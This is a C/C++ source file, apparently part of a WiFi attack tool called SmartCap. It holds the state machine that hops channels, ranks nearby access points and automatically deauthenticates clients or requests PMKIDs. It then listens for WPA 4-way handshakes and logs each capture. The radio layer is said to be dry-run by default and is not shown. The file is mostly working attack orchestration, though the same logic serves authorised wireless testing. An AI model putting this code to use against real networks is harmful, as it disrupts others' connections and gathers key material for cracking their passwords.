// SmartCap stage FSM. Pure logic, host-compilable. Dependencies:
//   - table / score / focus / attack kernel (logic only)
//   - radio adapter (the only door to the air; dry-run by default)

#include "smartcap_fsm.h"

#include "smartcap_result.h"
#include "smartcap_table.h"

#include <stdarg.h>
#include <stdio.h>
#include <string.h>

static const uint8_t kScanChannels[] = {1, 6, 11};
enum { kScanChannelCount = sizeof(kScanChannels) / sizeof(kScanChannels[0]) };

void smartcap_fsm_params_default(smartcap_fsm_params_t *p) {
    p->rescore_period_ms = 5000;
    p->scan_period_ms = 3000;       // mirrors the legacy 3s channel-hopping cadence
    p->scan_quick_period_ms = 1000; // hunt dwell when there is nothing to focus
    p->listen_timeout_ms = 4000;    // how long to wait for a handshake after acting
    p->cooldown_ms = 2000;          // pacing pause between a failed attempt and the next
}

void smartcap_fsm_begin(smartcap_fsm_t *f, smartcap_radio_t *radio,
                        smartcap_table_t *table, smartcap_score_params_t *score,
                        const smartcap_fsm_params_t *p, uint32_t now_ms) {
    memset(f, 0, sizeof(*f));
    f->radio = radio;
    f->table = table;
    f->score = score;
    f->p = *p;
    f->stage = SMCAP_STAGE_SCAN;
    f->fast = true; // nothing seen yet: hunt quickly until focus is non-empty
    f->rescore_next_ms = now_ms + p->rescore_period_ms;
    f->stage_until_ms = now_ms + p->scan_quick_period_ms;
    smartcap_radio_set_channel(radio, kScanChannels[0]);
}

smartcap_stage_t smartcap_fsm_stage(const smartcap_fsm_t *f) { return f->stage; }

void smartcap_fsm_set_cb(smartcap_fsm_t *f, smartcap_fsm_cb_fn fn, void *ctx) {
    f->cb = fn;
    f->cb_ctx = ctx;
}

void smartcap_fsm_rescore(smartcap_fsm_t *f) { f->want_rescore = true; }

// ---------------------------------------------------------------------------
// logging
// ---------------------------------------------------------------------------
static void fsmLog(smartcap_fsm_t *f, const char *fmt, ...) {
    if (!f->radio || !f->radio->logger) {
        return;
    }
    char line[SMCAP_RADIO_LOGLINE];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(line, sizeof(line), fmt, ap);
    va_end(ap);
    f->radio->logger(line);
}

static const char *strategyName(smartcap_strategy_t s) {
    switch (s) {
    case SMCAP_STRATEGY_DEAUTH_CLIENT: return "deauth-client";
    case SMCAP_STRATEGY_DEAUTH_BCAST: return "deauth-bcast";
    case SMCAP_STRATEGY_ASSOC_PMKID: return "assoc-pmkid";
    default: return "passive";
    }
}

// ---------------------------------------------------------------------------
// 4-way progress tracker (works for any target, passive captures included)
// ---------------------------------------------------------------------------
static smartcap_hs_slot_t *hsGet(smartcap_fsm_t *f, uint64_t key) {
    for (uint8_t i = 0; i < SMCAP_MAX_HS_SLOTS; ++i) {
        if (f->hs[i].key == key) {
            return &f->hs[i];
        }
    }
    return nullptr;
}

static smartcap_hs_slot_t *hsAlloc(smartcap_fsm_t *f, uint64_t key, uint32_t nowMs) {
    smartcap_hs_slot_t *slot = hsGet(f, key);
    if (slot) {
        return slot;
    }
    for (uint8_t i = 0; i < SMCAP_MAX_HS_SLOTS; ++i) {
        if (f->hs[i].key == 0) {
            slot = &f->hs[i];
            *slot = {};
            slot->key = key;
            slot->ts_ms = nowMs;
            return slot;
        }
    }
    // all busy: reclaimed the least recent tracker (same policy as the pcap cache)
    smartcap_hs_slot_t *oldest = &f->hs[0];
    for (uint8_t i = 1; i < SMCAP_MAX_HS_SLOTS; ++i) {
        if (f->hs[i].ts_ms < oldest->ts_ms) {
            oldest = &f->hs[i];
        }
    }
    *oldest = {};
    oldest->key = key;
    oldest->ts_ms = nowMs;
    return oldest;
}

// ---------------------------------------------------------------------------
// event handling
// ---------------------------------------------------------------------------
static void fsmCapture(smartcap_fsm_t *f, const uint8_t *bssid, uint32_t nowMs, bool pmkid) {
    smartcap_target_t *t = smartcap_table_find(f->table, bssid);
    if (!t || smartcap_target_closed(f->score, t)) {
        return;
    }
    if (pmkid) {
        t->flags |= SMCAP_HAVE_PMKID;
        smartcap_result_pmkid(t, nowMs);
        fsmLog(f, "close %02X:%02X:...:%02X via PMKID", bssid[0], bssid[1], bssid[5]);
    } else {
        t->flags |= SMCAP_HAVE_HS;
        smartcap_result_handshake(t, nowMs);
        fsmLog(f, "close %02X:%02X:...:%02X via full 4-way handshake", bssid[0], bssid[1], bssid[5]);
    }
    // Any capture is a success: clear the failure streak / exclusion counters so
    // the bookkeeping does not leak across targets that are only re-opened by
    // some future reconfiguration.
    t->consecutive_failures = 0;
    t->exclusion_count = 0;
    t->excluded_until_ms = 0;
}

static void fsmHandleEvent(smartcap_fsm_t *f, const smartcap_radio_event_t *ev, uint32_t nowMs) {
    switch (ev->type) {
    case SMCAP_EV_AP_SEEN:
    case SMCAP_EV_CLIENT_SEEN: {
        smartcap_target_t *t = smartcap_table_upsert(f->table, ev->bssid);
        if (ev->ssid[0]) {
            memcpy(t->ssid, ev->ssid, SMCAP_SSID_MAX);
        }
        smartcap_table_seen(f->table, t, (int8_t)ev->rssi, ev->channel, nowMs);
        if (ev->type == SMCAP_EV_CLIENT_SEEN) {
            smartcap_table_add_client(f->table, t, ev->mac, (int8_t)ev->rssi, nowMs);
        } else if (ev->pmkid_method) {
            // The AP's beacon carries an RSN IE: a silent assoc request may be
            // answered with a PMKID, so treat it as PMKID-method capable.
            t->flags |= SMCAP_PMKID_METHOD;
        }
        break;
    }
    case SMCAP_EV_EAPOL_SEEN: {
        uint64_t key = 0;
        memcpy(&key, ev->bssid, 6);
        smartcap_hs_slot_t *slot = hsAlloc(f, key, nowMs);
        if (!slot) {
            break;
        }
        slot->ts_ms = nowMs;
        if (ev->msg >= 1 && ev->msg <= 3) {
            slot->seen |= static_cast<uint8_t>(1u << (ev->msg - 1));
        } else if (ev->msg == 4 && (slot->seen & 0x7) == 0x7) {
            fsmCapture(f, ev->bssid, nowMs, false);
        }
        break;
    }
    case SMCAP_EV_PMKID_SEEN:
        fsmCapture(f, ev->bssid, nowMs, true);
        break;
    default:
        break;
    }
}

static void drainEvents(smartcap_fsm_t *f, uint32_t nowMs) {
    smartcap_radio_event_t ev;
    while (smartcap_radio_poll(f->radio, &ev)) {
        fsmHandleEvent(f, &ev, nowMs);
    }
}

// ---------------------------------------------------------------------------
// one FSM transition per stage (returns the next stage; same = stay put)
// ---------------------------------------------------------------------------
static smartcap_stage_t stageScan(smartcap_fsm_t *f, uint32_t now) {
    if (f->want_rescore) {
        f->want_rescore = false;
        return SMCAP_STAGE_RESCORE;
    }
    if (now >= f->rescore_next_ms) {
        return SMCAP_STAGE_RESCORE;
    }
    if (now >= f->stage_until_ms) {
        f->scan_index = static_cast<uint8_t>((f->scan_index + 1) % kScanChannelCount);
        smartcap_radio_set_channel(f->radio, kScanChannels[f->scan_index]);
        ++f->scan_hops;
        f->stage_until_ms = now + (f->fast ? f->p.scan_quick_period_ms : f->p.scan_period_ms);
        // Hunted every channel slot with nothing focusable -> rebuild now.
        if (f->fast && f->scan_hops >= kScanChannelCount) {
            return SMCAP_STAGE_RESCORE;
        }
    }
    return SMCAP_STAGE_SCAN;
}

static smartcap_stage_t stageRescore(smartcap_fsm_t *f, uint32_t now) {
    // The actual per-target recompute happens inside focus_build() at FOCUS;
    // this stage is just the timer gate so recomputation is periodic, never
    // per-packet.
    f->rescore_next_ms = now + f->p.rescore_period_ms;
    f->want_rescore = false;
    return SMCAP_STAGE_FOCUS;
}

static void fsmFocusLogAdapter(void *ctx, const char *line) {
    smartcap_fsm_t *f = static_cast<smartcap_fsm_t *>(ctx);
    fsmLog(f, "%s", line);
}

static smartcap_stage_t stageFocus(smartcap_fsm_t *f, uint32_t now) {
    const uint8_t n = smartcap_focus_build(f->table, f->score, now, &f->focus,
                                           fsmFocusLogAdapter, f);
    f->focus_started_ms = now;
    if (n == 0) {
        // Nothing worth acting on: back to scanning, fast hunt.
        f->fast = true;
        f->scan_index = 0;
        f->scan_hops = 0;
        f->stage_until_ms = now + f->p.scan_quick_period_ms;
        smartcap_radio_set_channel(f->radio, kScanChannels[0]);
        return SMCAP_STAGE_SCAN;
    }
    f->fast = false;
    f->focus_index = 0;
    return SMCAP_STAGE_ATTACK;
}

// Diagnostic line for the ATTACK stage: the current target's score plus the
// strongest open rivals *outside* the focus set. Logged in the FSM after the
// ATTACK line so a log strip shows whether the focus selection is safe or a
// comparable target is sitting just below the focus boundary.
static void logAttackRivals(smartcap_fsm_t *f, const smartcap_target_t *t, uint32_t now) {
    typedef struct {
        int16_t score;
        const uint8_t *mac;
    } rival_t;
    rival_t rivals[3];
    int n = 0;

    for (uint8_t i = 0; i < f->table->count; ++i) {
        const smartcap_target_t *c = &f->table->entries[i];
        if (c == t || smartcap_target_closed(f->score, c)) {
            continue;
        }
        bool inFocus = false;
        for (uint8_t k = 0; k < f->focus.count; ++k) {
            if (memcmp(f->focus.entries[k].bssid, c->bssid, 6) == 0) {
                inFocus = true;
                break;
            }
        }
        if (inFocus) {
            continue;
        }
        const int16_t s = smartcap_score(f->score, c, now);
        int j = n;
        while (j > 0 && rivals[j - 1].score < s) {
            rivals[j] = rivals[j - 1];
            --j;
        }
        rivals[j].score = s;
        rivals[j].mac = c->bssid;
        if (n < 3) {
            ++n;
        }
    }

    char line[SMCAP_RADIO_LOGLINE];
    int off = snprintf(line, sizeof(line), "  rivals-outside-focus");
    for (int k = 0; k < n; ++k) {
        off += snprintf(line + off, (size_t)sizeof(line) - (size_t)off, " %02X:%02X:...:%02X=%d",
                        rivals[k].mac[0], rivals[k].mac[1], rivals[k].mac[5], (int)rivals[k].score);
    }
    fsmLog(f, "%s", line);
}

static const smartcap_client_t *bestClient(const smartcap_target_t *t) {
    const smartcap_client_t *b = nullptr;
    for (uint8_t i = 0; i < t->n_clients; ++i) {
        const smartcap_client_t *c = &t->clients[i];
        if (!b || c->rssi > b->rssi) {
            b = c;
        }
    }
    return b;
}

static smartcap_stage_t stageAttack(smartcap_fsm_t *f, uint32_t now) {
    if (f->focus_index >= f->focus.count) {
        f->current = nullptr;
        return SMCAP_STAGE_RESCORE;
    }

    const smartcap_focus_entry_t *fe = &f->focus.entries[f->focus_index];

    // Resolve by BSSID snapshot each time: if the slot was evicted/reused the
    // target is gone and we just move on.
    smartcap_target_t *t = smartcap_table_find(f->table, fe->bssid);
    if (!t || smartcap_target_closed(f->score, t)) {
        ++f->focus_index;
        return (f->focus_index < f->focus.count) ? SMCAP_STAGE_ATTACK : SMCAP_STAGE_RESCORE;
    }

    f->current = t;
    f->strategy = smartcap_pick_strategy(t);

    uint8_t cur = 0;
    smartcap_radio_get_channel(f->radio, &cur);
    if (cur != t->channel) {
        smartcap_radio_set_channel(f->radio, t->channel); // dry-run: virtual only
    }

    fsmLog(f, "ATTACK ch=%u %02X:%02X:...:%02X strategy=%s score=%d",
           t->channel, t->bssid[0], t->bssid[1], t->bssid[5], strategyName(f->strategy),
           (int)smartcap_score(f->score, t, now));
    logAttackRivals(f, t, now);

    switch (f->strategy) {
    case SMCAP_STRATEGY_DEAUTH_CLIENT: {
        const smartcap_client_t *client = bestClient(t);
        if (client) {
            smartcap_radio_deauth_client(f->radio, t->bssid, client->mac);
        } else {
            f->strategy = SMCAP_STRATEGY_PASSIVE; // clients vanished: just listen
        }
        break;
    }
    case SMCAP_STRATEGY_DEAUTH_BCAST:
        smartcap_radio_deauth_bcast(f->radio, t->bssid);
        break;
    case SMCAP_STRATEGY_ASSOC_PMKID:
        smartcap_radio_assoc_pmkid(f->radio, t->bssid, t->ssid);
        break;
    default:
        break; // PASSIVE: no action, still listen for a natural reconnect
    }

    f->stage_until_ms = now + f->p.listen_timeout_ms;
    return SMCAP_STAGE_LISTEN;
}

static smartcap_stage_t stageListen(smartcap_fsm_t *f, uint32_t now) {
    const smartcap_target_t *t = f->current;
    if (t && ((t->flags & SMCAP_HAVE_HS) || (t->flags & SMCAP_HAVE_PMKID))) {
        fsmLog(f, "captured result for %02X:%02X:...:%02X (strategy %s)",
               t->bssid[0], t->bssid[1], t->bssid[5], strategyName(f->strategy));
        ++f->focus_index;
        f->current = nullptr;
        return (f->focus_index < f->focus.count) ? SMCAP_STAGE_ATTACK : SMCAP_STAGE_RESCORE;
    }

    if (now >= f->stage_until_ms) {
        // Timeout: this attempt failed (only an *active* method counts as a
        // failed attempt for the scoring penalty).
        const bool active = (f->strategy != SMCAP_STRATEGY_PASSIVE);
        if (t && active) {
            smartcap_target_t *m = smartcap_table_find(f->table, f->focus.entries[f->focus_index].bssid);
            if (m) {
                m->last_attack_ms = now;
                ++m->attack_count;
                ++m->consecutive_failures;
                fsmLog(f, "timeout after %u ms for %02X:%02X:...:%02X",
                       static_cast<unsigned>(f->p.listen_timeout_ms),
                       t->bssid[0], t->bssid[1], t->bssid[5]);
                // attack_count only ever grows while the target stays open (a
                // successful capture closes it), so it doubles as the
                // consecutive-failure streak.
                if (m->attack_count >= 3) {
                    fsmLog(f, "WARN: target %02X:%02X:...:%02X failed %u times in a row, "
                              "consider score/cooldown tuning",
                           m->bssid[0], m->bssid[1], m->bssid[5],
                           static_cast<unsigned>(m->attack_count));
                }
            }
        }
        f->current = nullptr;
        if (active) {
            f->stage_until_ms = now + f->p.cooldown_ms;
            return SMCAP_STAGE_COOLDOWN;
        }
        ++f->focus_index;
        return (f->focus_index < f->focus.count) ? SMCAP_STAGE_ATTACK : SMCAP_STAGE_RESCORE;
    }
    return SMCAP_STAGE_LISTEN;
}

static smartcap_stage_t stageCooldown(smartcap_fsm_t *f, uint32_t now) {
    if (now >= f->stage_until_ms) {
        ++f->focus_index;
        return (f->focus_index < f->focus.count) ? SMCAP_STAGE_ATTACK : SMCAP_STAGE_RESCORE;
    }
    return SMCAP_STAGE_COOLDOWN;
}

void smartcap_fsm_tick(smartcap_fsm_t *f, uint32_t nowMs) {
    // Bounded number of chained transitions per call so an overdue tick cannot
    // spin; normal chains are at most a handful of stages long.
    for (int step = 0; step < 24; ++step) {
        drainEvents(f, nowMs);

        smartcap_stage_t next = f->stage;
        switch (f->stage) {
        case SMCAP_STAGE_SCAN: next = stageScan(f, nowMs); break;
        case SMCAP_STAGE_RESCORE: next = stageRescore(f, nowMs); break;
        case SMCAP_STAGE_FOCUS: next = stageFocus(f, nowMs); break;
        case SMCAP_STAGE_ATTACK: next = stageAttack(f, nowMs); break;
        case SMCAP_STAGE_LISTEN: next = stageListen(f, nowMs); break;
        case SMCAP_STAGE_COOLDOWN: next = stageCooldown(f, nowMs); break;
        default: return;
        }

        if (next == f->stage) {
            return; // settled; further ticks will leave it as long as undueless
        }
        f->stage = next;
        if (f->cb) {
            uint32_t param = 0;
            switch (next) {
            case SMCAP_STAGE_SCAN:
                param = (f->stage_until_ms > nowMs) ? (f->stage_until_ms - nowMs) : 0;
                break;
            case SMCAP_STAGE_LISTEN:
                param = f->p.listen_timeout_ms;
                break;
            case SMCAP_STAGE_COOLDOWN:
                param = f->p.cooldown_ms;
                break;
            default:
                break;
            }
            f->cb(f, next, param, f->cb_ctx);
        }
    }
}